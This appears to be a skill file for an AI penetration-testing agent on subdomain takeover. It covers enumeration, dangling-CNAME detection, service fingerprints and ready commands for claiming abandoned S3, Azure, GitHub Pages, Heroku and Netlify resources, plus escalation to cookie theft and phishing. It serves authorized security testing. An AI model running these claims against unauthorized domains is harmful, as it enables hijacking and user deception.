---
name: subdomain-takeover
description: "Subdomain takeover discovery and exploitation via dangling CNAME records and cloud service misconfigurations"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, followRedirects, updateGraph, writeFinding, recordEvidence, getCapturedHeaders, subfinder, nuclei]
triggers: ["subdomain takeover", "dangling cname", "subdomain hijack", "cname takeover", "cloud takeover", "expired domain", "abandoned subdomain", "subdomain enumeration", "dns takeover", "virtual host takeover"]
contextBoosts: [endpoints]
mitreAttack: ["T1584", "T1583"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# Subdomain Takeover

## When to Use

Use this skill when you encounter:
- Subdomains pointing to external cloud services (S3, Azure, Heroku, GitHub Pages, Fastly, Netlify)
- CNAME records resolving to expired or deprovisioned domains
- HTTP responses containing service-specific "not found" pages on subdomains
- DNS enumeration results showing third-party hosting references
- Target with large attack surface and many subdomains (enterprise, SaaS)

## Do Not Use

- Target has no subdomains or minimal DNS footprint
- All CNAME records resolve to the target's own infrastructure
- CNAME targets are active and serving legitimate content
- Legal scope explicitly prohibits subdomain enumeration or DNS attacks

## Auth Context

Subdomain takeover is typically passive recon — no authentication required. DNS queries and HTTP probing are unauthenticated by nature. However:
- If the target's DNS provider requires credentials, you need access to verify records
- Some cloud takeover proofs (S3 bucket creation, Azure validation) require valid cloud accounts
- Stay within authorized scope — subdomain takeover can affect third-party services

---

## Subdomain Enumeration

### Automated DNS Brute-Force

```bash
# Passive aggregation first
subfinder -d target.com -silent -o subs.txt
amass enum -passive -d target.com -o amass.txt
assetfinder --subs-only target.com >> subs.txt

# Resolve which candidates are live
cat subs.txt amass.txt | sort -u | dnsx -silent -a -cname -o resolved.txt
```

### Certificate Transparency Logs

```bash
# crt.sh historical certificate names
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | \
  sed 's/^\*\.//' | tr 'A-Z' 'a-z' | sort -u > ct_subs.txt

# Censys / SecurityTrails style CT mirrors can be queried with API keys for deeper history
```

### DNS Brute-Force (Active)

```bash
# Wordlist-based brute with dnsx (fast, threaded)
dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -silent -a -cname

# Or shuffledns over massdns for very large lists
shuffledns -d target.com -w subdomains-top1million-5000.txt -r resolvers.txt -o brute.txt
```

### Aggregation Strategy

1. Run passive enumeration (amass + subfinder + crt.sh)
2. Deduplicate results into a single list
3. Probe each subdomain for live HTTP responses
4. Extract CNAME records for all live subdomains
5. Flag any CNAME pointing to external services

```bash
# Full pipeline: dedupe -> probe HTTP -> pull CNAMEs -> filter for third-party services
cat subs.txt amass.txt ct_subs.txt | sort -u | httpx -silent -cname -title -status-code | tee live.txt
grep -Ei 's3|amazonaws|azurewebsites|cloudapp|github\.io|herokuapp|herokudns|fastly|netlify|cloudfront|shopify|tumblr|wordpress|zendesk|helpjuice|surge\.sh|webflow|pantheon' live.txt > takeover_candidates.txt
```

---

## DNS Analysis

### CNAME Record Lookup

```bash
# Resolve the full chain for each candidate
dig +short CNAME subdomain.target.com
dig +cname subdomain.target.com +noall +answer      # verbose form with TTLs
host -t cname subdomain.target.com
nslookup -type=cname subdomain.target.com 8.8.8.8   # verify against a second resolver

# Batch CNAME extraction
cat takeover_candidates.txt | dnsx -silent -cname

# Confirm NXDOMAIN on the CNAME TARGET itself (dangling proof)
dig +short service.azurewebsites.net    # empty / NXDOMAIN = dangling
```

### Dangling CNAME Detection Logic

A CNAME is dangling when:
1. `subdomain.target.com` → CNAME → `service.azurewebsites.net`
2. `service.azurewebsites.net` itself resolves (or NXDOMAIN)
3. The target has **no active resource** at the CNAME endpoint
4. The claimed service (Azure, S3, etc.) can be re-provisioned by anyone

### Key Indicators

| Signal | Meaning |
|--------|---------|
| CNAME → external service | Potential takeover candidate |
| CNAME → NXDOMAIN on CNAME target | Dangling — high confidence |
| CNAME → active but 404/error page | Verify service ownership |
| CNAME → expired domain | Domain can be re-registered |

---

## Cloud Service Takeover

### AWS S3 Bucket

**Fingerprint:** `NoSuchBucket`, `The specified bucket does not exist`, `404: Not Found`

```bash
# DNS check: subdomain -> bucket virtual-host
dig +short CNAME old-blog.target.com     # e.g. target-site.s3.amazonaws.com
curl -s https://old-blog.target.com      # or curl -s https://target-site.s3.amazonaws.com/
```

**Response to look for:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>NoSuchBucket</Code>
<Message>The specified bucket does not exist</Message>
<BucketName>target-site</BucketName></Error>
```

**Exploitation:**

```bash
# Claim: create a bucket with the EXACT referenced name, in the right region
aws s3 mb s3://target-site --region us-east-1
echo '<h1>Security Research — Takeover Proof</h1>' > proof.html
aws s3 cp proof.html s3://target-site/proof.html --acl public-read
curl -s http://old-blog.target.com/proof.html   # verify control
```

### Azure Web Apps

**Fingerprint:** `Azure Web App - Your web app is running and waiting for your content`

```bash
dig +short CNAME legacy-app.target.com    # e.g. legacy-app.azurewebsites.net
curl -s http://legacy-app.target.com
```

**Response to look for:**

```html
<h4>404 Web Site not found.</h4>
<p>The web app ... is running and waiting for your content</p>
```

**Exploitation:**
- Create Azure account → create Web App with the exact hostname
- Deploy content to prove control

```bash
az webapp create -g rg-takeover -p asp-plan -n legacy-app
# Then add the custom domain (Azure validates DNS ownership via TXT aspNetValidation,
# but for a truly dangling CNAME the app claims the hostname directly):
az webapp config hostname add --webapp-name legacy-app -g rg-takeover --hostname legacy-app.target.com
```

### GitHub Pages

**Fingerprint:** `There isn't a GitHub Pages site here.`, `For root URLs`

```bash
dig +short CNAME docs.target.com    # e.g. targetorg.github.io
curl -s http://docs.target.com
```

**Response to look for:**

```html
<h1>There isn't a GitHub Pages site here.</h1>
<p>If you're trying to publish one, <a href="https://help.github.com/pages/">read the full documentation</a> to learn how to set up GitHub Pages for your repository, organization, or user account.</p>
```

**Exploitation:**
- Fork or create a repository named `username.github.io`
- Add a CNAME file pointing to the subdomain
- Push content to prove control

```bash
git clone https://github.com/<attacker>/takeover-proof.git && cd takeover-proof
echo "docs.target.com" > CNAME
echo '<h1>Takeover Proof</h1>' > index.html
git add . && git commit -m 'proof' && git push origin main
# Repo Settings -> Pages -> Custom domain = docs.target.com; then verify:
curl -s http://docs.target.com
```

### Heroku

**Fingerprint:** `no such app`, `no-hierarchical-name`

```bash
dig +short CNAME staging-api.target.com    # e.g. staging-api.herokuapp.com
curl -s http://staging-api.target.com
```

**Response to look for:**

```html
<title>No such app</title>
<p>There's nothing here, yet.</p>
<!-- etag reference contains "no-hierarchical-name" -->
```

**Exploitation:**
- Create Heroku app with the exact subdomain name
- Deploy proof content

```bash
heroku create staging-api        # app name must match the herokuapp.com prefix
heroku domains:add staging-api.target.com -a staging-api
echo '<h1>Takeover Proof</h1>' > index.html && git init && git add . && git commit -m p && git push heroku main
```

### Fastly

**Fingerprint:** `Fastly error: unknown domain subdomain.target.com`

```bash
dig +short CNAME cdn.target.com    # e.g. f8932.cdn.jsdelivr.net / *.global.ssl.fastly.net
curl -s http://cdn.target.com
```

**Response to look for:**

```text
Fastly error: unknown domain: cdn.target.com
```

**Exploitation:**
- Create Fastly account → add custom domain matching the subdomain
- Upload proof content

### Netlify

**Fingerprint:** `Not Found - Request ID:`

```bash
dig +short CNAME promo.target.com    # e.g. some-site.netlify.app / netlifyglobalcdn.com
curl -s http://promo.target.com
```

**Response to look for:**

```text
Not found - Request ID: 01F8XK...
```

**Exploitation:**
- Create Netlify site with the exact subdomain name
- Deploy content to prove control

```bash
netlify sites:create --name promo-target       # claim matching site name
netlify deploy --dir ./proof                    # custom domain: promo.target.com
```

### Cloudfront

**Fingerprint:** `Bad request.`, `ERROR: The request could not be satisfied`

```bash
dig +short CNAME assets.target.com    # e.g. d3xxxxxxxx.cloudfront.net
curl -s http://assets.target.com
```

**Response to look for:**

```text
ERROR: The request could not be satisfied
Generated by cloudfront (CloudFront Point of Presence: ...)
```

**Note:** CloudFront takeovers require the distribution's alternate domain name (CNAME) to be unclaimed AND the account to still exist; verify the CloudFront distribution ID is deleted but the account is active before claiming.

**Exploitation:**
- Create CloudFront distribution with the exact domain
- Upload proof content

---

## Service Fingerprints

Always verify the actual response before claiming takeover. Common patterns:

| Service | Fingerprint | Confidence |
|---------|------------|------------|
| GitHub Pages | `There isn't a GitHub Pages site here` | HIGH |
| AWS S3 | `NoSuchBucket` / `The specified bucket does not exist` | HIGH |
| Azure | `Your web app is running and waiting for your content` | HIGH |
| Heroku | `No such app` | HIGH |
| Fastly | `unknown domain subdomain.target.com` | HIGH |
| Netlify | `Not Found - Request ID` | MEDIUM |
| Cloudfront | `Bad request.` / `ERROR: The request could not be satisfied` | MEDIUM |
| Shopify | `Sorry, this shop is currently unavailable.` | MEDIUM |
| Tumblr | `Whatever you were looking for doesn't currently exist at this address` | LOW |
| WordPress.com | `Do you want to register` | LOW |

**Verification steps before exploitation:**
1. Confirm CNAME points to the claimed service (dig)
2. Confirm HTTP response matches the service fingerprint
3. Confirm the service allows public registration of the hostname
4. Confirm no existing content is served (not just an error page)

---

## Exploitation Steps

### Step 1: Confirm Dangling CNAME

```bash
dig +short CNAME $SUB                     # external service target
dig +short <service-target>               # NXDOMAIN / no answer = dangling
curl -s "http://$SUB" | grep -i "<service fingerprint>"
```

### Step 2: Verify Service Takeover Feasibility

```bash
# Cross-resolver consistency (rule out stale cache)
dig +short CNAME $SUB @8.8.8.8
dig +short CNAME $SUB @1.1.1.1
dig +short CNAME $SUB @9.9.9.9

# Confirm the service allows claiming this exact hostname (check provider docs /
# can-i-take-over-xyz matrix for the specific service's takeover feasibility)
```

### Step 3: Claim the Service

- **S3:** `aws s3 mb s3://bucket-name`
- **Azure:** Create Web App with matching hostname
- **GitHub Pages:** Create repo, add CNAME file
- **Heroku:** `heroku create subdomain-target-com`
- **Fastly:** Add custom domain in dashboard
- **Netlify:** Create site with matching name

```bash
aws s3 mb s3://bucket-name --region us-east-1     # S3
heroku create subdomain-target-com                # Heroku
netlify sites:create --name matching-name         # Netlify
```

### Step 4: Upload Proof Content

Create a proof page:

```html
<!doctype html>
<html>
<head><title>Security Research — Subdomain Takeover Proof</title></head>
<body>
<h1>Subdomain Takeover Proof of Concept</h1>
<p>This page was placed by an authorized security assessment. Contact: security-research@your-org.example</p>
</body>
</html>
```

```bash
aws s3 cp proof.html s3://bucket-name/ --acl public-read   # then verify at http://$SUB/proof.html
```

### Step 5: Document & Report

- Screenshot of the proof page loading at the subdomain URL
- DNS records before and after takeover
- CNAME chain evidence
- Impact assessment

---

## Detection Tools

### Automated Scanning

```bash
# subzy — purpose-built takeover scanner with a large fingerprint set
subzy run --targets live.txt --hide_fails --concurrency 10

# can-i-take-over-xyz fingerprints as a quick grep reference
curl -s https://raw.githubusercontent.com/EdOverflow/can-i-take-over-xyz/master/README.md | \
  grep -Ei 'vulnerable|fingerprint' | head -40
```

### Nuclei Templates (Recommended)

```bash
nuclei -l live.txt -t takeovers/ -silent -o takeovers_found.txt
# Or run only the CNAME-based templates against raw subdomain list:
nuclei -l all_subs.txt -tags takeover -c 25 -silent
```

### Manual Verification

```bash
# One-shot manual check per candidate: CNAME + HTTP body in two commands
dig +short cname $SUB && curl -s "http://$SUB" -L --max-time 10 | grep -Ei 'nosuchbucket|no such app|isn.t a github|unknown domain|waiting for your content|not found - request id'
```


---

## Impact Assessment

### Direct Impact

| Impact | Description |
|--------|-------------|
| **Cookie Theft** | If subdomain shares parent domain cookies (non-HttpOnly, Domain=.target.com) |
| **Phishing** | Serve convincing login page at legitimate subdomain |
| **Credential Harvesting** | Fake SSO/OAuth endpoint captures tokens |
| **XSS via Subdomain** | Inject scripts that execute in target.com context |
| **CSP Bypass** | Subdomain may be whitelisted in Content-Security-Policy |

### Cookie Impact Analysis

```bash
# Check whether the parent domain sets broad-scope cookies that a claimed subdomain would receive
curl -sk -D - https://target.com/login -o /dev/null | grep -i set-cookie
# Look for: Domain=.target.com (or Domain=target.com) WITHOUT HttpOnly on session cookies

# If such a cookie exists, a takeover page can read it via document.cookie in the subdomain context
```


### Escalation Paths

1. **Subdomain takeover → cookie theft → session hijack** (if cookies are scoped broadly)
2. **Subdomain takeover → phishing → credential theft** (users trust *.target.com)
3. **Subdomain takeover → XSS → CSP bypass → data exfiltration** (if subdomain is CSP-whitelisted)
4. **Subdomain takeover → OAuth abuse** (if subdomain is registered as OAuth redirect URI)

---

## Anti-Hallucination

### Verification Checklist

Before reporting a subdomain takeover, **every** claim must be verified with real tool output:

- [ ] **CNAME record verified:** `dig +short CNAME subdomain.target.com` shows external service
- [ ] **Service fingerprint confirmed:** HTTP response matches known takeover pattern
- [ ] **Claimability verified:** Service actually allows public re-registration of hostname
- [ ] **No existing content:** Target subdomain is not serving legitimate content
- [ ] **DNS propagation confirmed:** CNAME is consistent across multiple DNS servers

### Do NOT Claim

- Do NOT claim takeover if CNAME points to active infrastructure owned by the target
- Do NOT assume a service is vulnerable without checking the actual HTTP response
- Do NOT report a finding based on DNS records alone — HTTP verification is required
- Do NOT claim impact (cookie theft, phishing) without verifying cookie scope and CSP policies
- Do NOT fabricate tool output or response bodies — use `recordEvidence` to store real output

### Evidence Requirements

Every subdomain takeover finding requires:
1. DNS dig output showing the CNAME chain
2. HTTP response body showing the service fingerprint
3. Screenshot or proof of the claimed service endpoint
4. Description of how the service was claimed (if exploited)

## Trigger Conditions

Activate during subdomain enumeration when a subdomain's CNAME points to an external cloud/service (S3, Azure, GitHub Pages, Heroku, Fastly, Netlify, CloudFront) or to an expired/dangling target. Trigger on HTTP "not found"/service-specific error pages at subdomains, or DNS results referencing third-party hosting. Strong signal: a large subdomain footprint (enterprise/SaaS). Do not trigger when all CNAMEs resolve to the target's own infra, targets are active/serving legit content, or scope prohibits DNS enumeration.

## Detection Approach

Enumerate subdomains (passive CT logs + active brute), then for each live subdomain extract the CNAME chain and classify: CNAME→external service, CNAME→NXDOMAIN on the target, or active-but-error page. A dangling CNAME exists when the subdomain points to a service the target no longer has an active resource at. Verify the service fingerprint from the actual HTTP response (`NoSuchBucket`, `no such app`, GitHub Pages "isn't a site here", etc.). Confirm the service permits public re-registration of that exact hostname and that no legitimate content is served. Only after CNAME + fingerprint + claimability are confirmed should you attempt to claim it (requires valid cloud accounts, in scope). Route confirmed takeovers to impact analysis (cookie theft if broad Domain cookie, phishing/OAuth pivot).

## Pitfalls

- Claiming takeover from a DNS record alone — HTTP verification of the fingerprint is required.
- Assuming a service is claimable without confirming it allows public re-registration of the hostname.
- Reporting a CNAME to active, target-owned infrastructure as dangling.
- Trusting an error page that is actually the real service's generic 404 (still owned).
- Ignoring DNS propagation consistency across resolvers.
- Claiming impact (cookie theft) without verifying cookie scope/CSP.

## Verification & Impact

CONFIRMED when evidence shows: the CNAME chain to the external service, the matching service fingerprint response, and (if exploited) a claimed endpoint serving proof content at the subdomain. SUSPECTED when a dangling CNAME/fingerprint is observed but claimability isn't verified — record as candidate. Document impact by pivot potential: cookie theft/session hijack (broad Domain cookies), phishing/credential harvest, XSS-in-context/CSP bypass (if subdomain whitelisted), or OAuth redirect abuse. Capture dig output, HTTP fingerprint, and proof via `recordEvidence`.
